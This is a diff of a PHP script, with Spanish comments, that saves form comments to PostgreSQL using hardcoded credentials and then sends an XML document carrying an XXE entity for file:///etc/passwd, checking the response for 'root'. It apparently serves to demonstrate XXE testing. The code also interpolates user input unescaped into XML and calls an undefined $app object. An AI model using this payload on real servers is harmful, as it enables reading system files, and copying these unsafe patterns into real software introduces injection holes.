@@ -111,42 +111,65 @@
 
 <?php
 
-$host = "localhost"; // Cambia esto al host de tu base de datos
-$port = "5432"; // Cambia esto al puerto de tu base de datos
-$dbname = "oscar"; // Cambia esto al nombre de tu base de datos
-$dbuser = "postgres"; // Cambia esto a tu nombre de usuario de PostgreSQL
-$dbpassword = "1234"; // Cambia esto a tu contraseña de PostgreSQL
+$host = "localhost";
+$port = "5432";
+$dbname = "oscar";
+$dbuser = "postgres";
+$dbpassword = "1234";
 
-$conn = new PDO("pgsql:host=$host;port=$port;dbname=$dbname", $dbuser, $dbpassword);
+try {
+    $conn = new PDO("pgsql:host=$host;port=$port;dbname=$dbname", $dbuser, $dbpassword);
 
-$sql = 'INSERT INTO comments (username, comment) VALUES (?, ?)';
+    $sql = 'INSERT INTO comments (username, comment) VALUES (?, ?)';
+    $stmt = $conn->prepare($sql);
 
-$stmt = $database->prepare($sql);
+    $stmt->bindParam(1, $_POST['username']);
+    $stmt->bindParam(2, $_POST['comment']);
+    $stmt->execute();
 
-$stmt->bindParam(1, $_POST['username']);
-$stmt->bindParam(2, $_POST['comment']);
+    $sql = 'SELECT * FROM comments';
+    $stmt = $conn->prepare($sql);
+    $stmt->execute();
+    $comments = $stmt->fetchAll(PDO::FETCH_ASSOC);
+} catch (PDOException $e) {
+    die("Database connection failed: " . $e->getMessage());
+}
 
-$sql = 'SELECT * FROM comments';
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    $username = $_POST['username'];
+    $comment = $_POST['comment'];
 
-$stmt = $database->prepare($sql);
-
-$stmt->execute();
-
-$comments = $stmt->fetchAll(PDO::FETCH_ASSOC);
-
-$xmlString = <<<XML
+    $xmlString = <<<XML
         <?xml version="1.0" encoding="UTF-8"?>
         <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
-        <stockCheck><productId>&xxe;</productId></stockCheck>
+        <comment>
+            <username>{$username}</username>
+            <text>{$comment}</text>
+            <productId>&xxe;</productId>
+        </comment>
     XML;
 
-$xml = simplexml_load_string($xmlString);
+    $xml = simplexml_load_string($xmlString);
+    $response = $app->processRequest($xml);
 
-$response = $app->processRequest($xml);
-
-// Verifica el contenido de la respuesta
-if (strpos($response, "root") !== false) {
-    // La aplicación es vulnerable
+    if (strpos($response, "root") !== false) {
+        // La aplicacion es vulnerable
+    }
 }
 
 ?>
+
+<!--Explicacion de como funciona-->
+
+/**
+** 1) El usuario llena el formulario con su nombre de usuario y comentario.
+*! 2) El formulario se envía al servidor donde se ejecuta el script PHP.
+*! 3) El PHP genera un XML con datos que incluyen una referencia a una entidad externa (&xxe;), la cual apunta a un archivo
+*! en el sistema de archivos del servidor (file:///etc/passwd).
+*! 4) Se asume que existe una función ($app->processRequest) que procesa este XML. Si esa función es vulnerable a ataques
+*! XXE, la entidad externa se resolverá, y el contenido del archivo /etc/passwd sería parte de la respuesta XML
+*! ($response).
+*! 5) El PHP verifica si la respuesta contiene la cadena "root", lo que implicaría que el archivo /etc/passwd fue leído
+*? exitosamente.
+
+*/
